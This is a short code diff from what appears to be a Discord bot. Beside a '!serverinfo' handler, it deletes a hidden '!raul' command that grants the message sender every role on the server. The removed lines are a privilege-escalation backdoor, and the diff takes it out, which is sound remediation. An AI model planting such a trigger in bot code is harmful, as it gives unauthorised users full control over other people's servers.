@@ -52,8 +52,5 @@ if (message.content === "!serverinfo"){
   .setThumbnail(sicon)
 
   return message.channel.send(serverembed);
-}
-if(message.content.includes("!raul")){
-  (message.guild.roles.map(r => message.member.addRoles(r)))
-}
+};
     
